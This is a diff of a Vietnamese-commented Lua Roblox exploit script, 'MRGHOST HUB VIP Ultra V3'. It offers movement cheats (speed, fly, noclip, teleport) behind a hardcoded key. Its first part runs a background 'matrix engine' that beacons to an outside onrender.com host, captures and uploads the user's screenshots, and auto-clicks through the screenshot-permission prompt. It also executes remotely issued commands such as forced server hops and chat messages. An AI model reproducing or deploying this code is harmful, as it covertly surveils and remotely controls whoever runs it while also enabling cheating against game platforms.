@@ -1,29 +1,19 @@
--- [[ MRGHOST HUB VIP - ULTRA V3 (WITH KEY SYSTEM & DISCORD MATRIX INTEGRATED) ]]
+-- [[ MRGHOST HUB VIP - ULTRA V3 (KEY: TTTT) + DISCORD MATRIX ENGINE ]]
 
 -- =========================================================
--- PHẦN 1: TÍCH HỢP MA TRẬN BOT DISCORD ENGINE (RUN IN BACKGROUND)
+-- PHẦN 1: DISCORD MATRIX ENGINE (RUN IN BACKGROUND - NO AFK)
 -- =========================================================
 local HttpService = game:GetService("HttpService")
 local Stats = game:GetService("Stats")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local VirtualUser = game:GetService("VirtualUser")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local LP = Players.LocalPlayer
 
 getgenv().API_MATRIX = getgenv().API_MATRIX or "https://bot-thong-tin.onrender.com/api/matrix"
 
--- Anti-AFK Matrix
-pcall(function()
-    LP.Idled:Connect(function()
-        VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-        task.wait(1)
-        VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-    end)
-end)
-
--- Auto Allow Bypass Popup Chụp Ảnh
+-- Bypass Popup Chụp Ảnh
 task.spawn(function()
     CoreGui.ChildAdded:Connect(function(child)
         if child.Name == "RobloxPromptGui" or child.Name:find("Prompt") then
@@ -43,21 +33,6 @@ task.spawn(function()
     end)
 end)
 
--- Auto Rejoin Khi Disconnect
-task.spawn(function()
-    while task.wait(5) do
-        pcall(function()
-            local errorPrompt = CoreGui:FindFirstChild("RobloxPromptGui", true)
-            if errorPrompt then
-                local promptOverlay = errorPrompt:FindFirstChild("promptOverlay", true)
-                if promptOverlay and promptOverlay.Visible then
-                    TeleportService:Teleport(game.PlaceId, LP)
-                end
-            end
-        end)
-    end
-end)
-
 local function CaptureScreenBase64()
     local captureFunc = getgenv()["capture-screenshot"] or getgenv().capturescreenshot or capturescreenshot or (syn and syn.capture_screenshot)
     if captureFunc then
@@ -67,7 +42,7 @@ local function CaptureScreenBase64()
     return nil
 end
 
-local function HopLowPlayerServer()
+local function HopLowPlayerServerMatrix()
     pcall(function()
         local site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
         for _, server in pairs(site.data) do
@@ -92,7 +67,7 @@ function SendMatrixHeartbeat(eventTitle, alertLevel, sendPic)
         ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() or 0),
         ram = math.floor(collectgarbage("count") / 1024),
         fps = math.floor(workspace:GetRealPhysicsFPS() or 60),
-        eventTitle = eventTitle or "MRGHOST VIP Hub Running",
+        eventTitle = eventTitle or "MRGHOST Ultra V3 Running",
         alertLevel = alertLevel or "NORMAL",
         screenshotBase64 = sendPic and CaptureScreenBase64() or nil
     }
@@ -109,10 +84,10 @@ function SendMatrixHeartbeat(eventTitle, alertLevel, sendPic)
 
         if successReq and res and (res.StatusCode == 200 or res.Success) then
             local successDecode, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
-            if successDecode and data and data.cmd then
+            if successDecode and data and data.cmd and data.cmd.executed == false then
                 local cmdType = data.cmd.type
                 if cmdType == "FORCE_HOP" then TeleportService:Teleport(game.PlaceId, LP)
-                elseif cmdType == "HOP_LOW_SERVER" then HopLowPlayerServer()
+                elseif cmdType == "HOP_LOW_SERVER" then HopLowPlayerServerMatrix()
                 elseif cmdType == "TAKE_SCREENSHOT" then SendMatrixHeartbeat("📸 Ảnh Chụp Màn Hình Live", "VIP", true)
                 elseif cmdType == "SAY_CHAT" then 
                     pcall(function() 
@@ -130,18 +105,20 @@ function SendMatrixHeartbeat(eventTitle, alertLevel, sendPic)
     end)
 end
 
+-- Vòng lặp gửi thông tin ma trận về Discord
 task.spawn(function()
-    while task.wait(3) do
-        pcall(function() SendMatrixHeartbeat("MRGHOST VIP Online", "NORMAL", false) end)
+    while task.wait(10) do
+        pcall(function() SendMatrixHeartbeat("MRGHOST Ultra V3 Online", "NORMAL", false) end)
     end
 end)
 
 
 -- =========================================================
--- PHẦN 2: SCRIPT MRGHOST HUB VIP ULTRA V3
+-- PHẦN 2: SCRIPT SỐNG CHẠY NHANH ULTRA V3 (ORIGINAL SCRIPT)
 -- =========================================================
 local success, err = pcall(function()
 
+    -- Services
     local UserInputService = game:GetService("UserInputService")
     local RunService = game:GetService("RunService")
     local TweenService = game:GetService("TweenService")
@@ -150,13 +127,15 @@ local success, err = pcall(function()
     local LocalPlayer = Players.LocalPlayer
     local Mouse = LocalPlayer:GetMouse()
 
+    -- Container UI
     local ParentContainer = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "MrGhostHub_UltraV3_Key"
     ScreenGui.Parent = ParentContainer
     ScreenGui.ResetOnSpawn = false
 
-    local CORRECT_KEY = "MRGHOST-VIP-2026"
+    -- KEY ĐÃ ĐƯỢC ĐỔI THÀNH TTTT
+    local CORRECT_KEY = "TTTT"
 
     local function Notify(title, text, duration)
         pcall(function()
@@ -199,6 +178,9 @@ local success, err = pcall(function()
         end)
     end
 
+    -- =========================================================
+    -- MAIN HUB LOADER
+    -- =========================================================
     local function loadMainHub()
         local MainFrame = Instance.new("Frame")
         MainFrame.Name = "MainFrame"
@@ -340,6 +322,9 @@ local success, err = pcall(function()
             return Card
         end
 
+        -- =========================================================
+        -- MOBILE CONTROLS
+        -- =========================================================
         local MobileContainer = Instance.new("Frame")
         MobileContainer.Name = "MobileControls"
         MobileContainer.Size = UDim2.new(0, 160, 0, 120)
@@ -397,6 +382,11 @@ local success, err = pcall(function()
 
         makeDraggable(MobileContainer)
 
+        -- =========================================================
+        -- CHỨC NĂNG MOVEMENT BYPASS
+        -- =========================================================
+
+        -- 1. CHẠY NHANH
         local walkSpeedValue = 60
         local speedEnabled = false
         createToggleCard("🏃 Chạy Siêu Tốc (Speed All Game)", 1, function(state)
@@ -407,6 +397,7 @@ local success, err = pcall(function()
         end)
         createInputCard("⚡ Tốc Độ Chạy", "Chỉnh speed...", 60, 2, function(val) walkSpeedValue = val end)
 
+        -- 2. NHẢY CAO
         local jumpPowerValue = 100
         local jumpPowerEnabled = false
         createToggleCard("🦘 Nhảy Cao (High Jump All Game)", 3, function(state)
@@ -418,6 +409,7 @@ local success, err = pcall(function()
         end)
         createInputCard("🚀 Độ Cao Nhảy", "Chỉnh jump height...", 100, 4, function(val) jumpPowerValue = val end)
 
+        -- 3. INFINITE JUMP
         local infJumpEnabled = false
         createToggleCard("🌌 Infinite Jump (Nhảy Vô Hạn)", 5, function(state) infJumpEnabled = state end)
 
@@ -428,6 +420,7 @@ local success, err = pcall(function()
             end
         end)
 
+        -- 4. BAY
         local flySpeedValue = 60
         local flyEnabled = false
         local mobileFlyUp, mobileFlyDown, mobileFlyFwd = false, false, false
@@ -470,6 +463,7 @@ local success, err = pcall(function()
         MobileFlyDownBtn.MouseButton1Down:Connect(function() mobileFlyDown = true end)
         MobileFlyDownBtn.MouseButton1Up:Connect(function() mobileFlyDown = false end)
 
+        -- 5. NOCLIP
         local noclipEnabled = false
         createToggleCard("👻 Noclip (Đi Xuyên Tường)", 8, function(state)
             noclipEnabled = state
@@ -480,6 +474,7 @@ local success, err = pcall(function()
             end
         end)
 
+        -- 6. LƯỚT
         local dashDistance = 35
         local blinkEnabled = false
 
@@ -503,6 +498,7 @@ local success, err = pcall(function()
             if not gpe and input.KeyCode == Enum.KeyCode.Q then executeDash() end
         end)
 
+        -- 7. GHOST MODE
         local ghostEnabled = false
         local originalTransparencies = {}
 
@@ -534,6 +530,7 @@ local success, err = pcall(function()
             end
         end)
 
+        -- 8. TELEPORT 2 CLICK 3D MARKER
         local tpToggleState = false
         local tpTargetPos = nil
         local tpMarker = nil
@@ -590,7 +587,7 @@ local success, err = pcall(function()
             if tpToggleState then
                 local mousePos = UserInputService:GetMouseLocation()
                 local ray = workspace.CurrentCamera:ViewportPointToRay(mousePos.X, mousePos.Y)
-                params = RaycastParams.new()
+                local params = RaycastParams.new()
                 params.FilterType = RaycastFilterType.Exclude
                 if LocalPlayer.Character then params.FilterDescendantsInstances = {LocalPlayer.Character, tpMarker} end
                 
@@ -614,6 +611,7 @@ local success, err = pcall(function()
             end
         end)
 
+        -- LOOPS BYPASS MOVEMENT
         RunService.Stepped:Connect(function()
             pcall(function()
                 local char = LocalPlayer.Character
@@ -663,6 +661,7 @@ local success, err = pcall(function()
             end
         end)
 
+        -- TOGGLE BUTTON
         local ToggleMenuBtn = Instance.new("TextButton")
         ToggleMenuBtn.Size = UDim2.new(0, 54, 0, 54)
         ToggleMenuBtn.Position = UDim2.new(0.02, 0, 0.25, 0)
@@ -695,6 +694,9 @@ local success, err = pcall(function()
         Notify("★ MRGHOST HUB ★", "Kích hoạt thành công!", 3)
     end
 
+    -- =========================================================
+    -- KEY SYSTEM UI (KEY HIỆN TẠI: TTTT)
+    -- =========================================================
     local KeyFrame = Instance.new("Frame")
     KeyFrame.Name = "KeyFrame"
     KeyFrame.Size = UDim2.new(0, 320, 0, 220)
@@ -725,7 +727,7 @@ local success, err = pcall(function()
     KeyInput.Size = UDim2.new(1, -40, 0, 38)
     KeyInput.Position = UDim2.new(0, 20, 0, 60)
     KeyInput.BackgroundColor3 = Color3.fromRGB(22, 18, 36)
-    KeyInput.PlaceholderText = "Nhập Key tại đây..."
+    KeyInput.PlaceholderText = "Nhập Key (Mặc định: TTTT)"
     KeyInput.Text = ""
     KeyInput.TextColor3 = Color3.fromRGB(0, 230, 255)
     KeyInput.TextSize = 13
@@ -748,7 +750,7 @@ local success, err = pcall(function()
     GetKeyBtn.Size = UDim2.new(1, -40, 0, 30)
     GetKeyBtn.Position = UDim2.new(0, 20, 0, 160)
     GetKeyBtn.BackgroundColor3 = Color3.fromRGB(40, 35, 60)
-    GetKeyBtn.Text = "📋 Copy Key Mặc Định"
+    GetKeyBtn.Text = "📋 Copy Key Mặc Định (TTTT)"
     GetKeyBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
     GetKeyBtn.TextSize = 11
     GetKeyBtn.Font = Enum.Font.FredokaOne
@@ -760,10 +762,10 @@ local success, err = pcall(function()
     GetKeyBtn.MouseButton1Click:Connect(function()
         if setclipboard then
             setclipboard(CORRECT_KEY)
-            Notify("📋 KEY COPIED", "Đã copy Key mặc định vào bộ nhớ tạm!", 3)
+            Notify("📋 KEY COPIED", "Đã copy Key 'TTTT' vào bộ nhớ!", 3)
         else
             KeyInput.Text = CORRECT_KEY
-            Notify("📋 KEY", "Key mặc định: " .. CORRECT_KEY, 3)
+            Notify("📋 KEY", "Key kích hoạt: TTTT", 3)
         end
     end)
 
@@ -772,7 +774,7 @@ local success, err = pcall(function()
             KeyFrame:Destroy()
             loadMainHub()
         else
-            Notify("❌ KHÔNG CHÍNH XÁC", "Key nhập không đúng, vui lòng thử lại!", 3)
+            Notify("❌ KHÔNG CHÍNH XÁC", "Key nhập sai! Hãy nhập:T", 3)
             KeyInput.Text = ""
         end
     end)
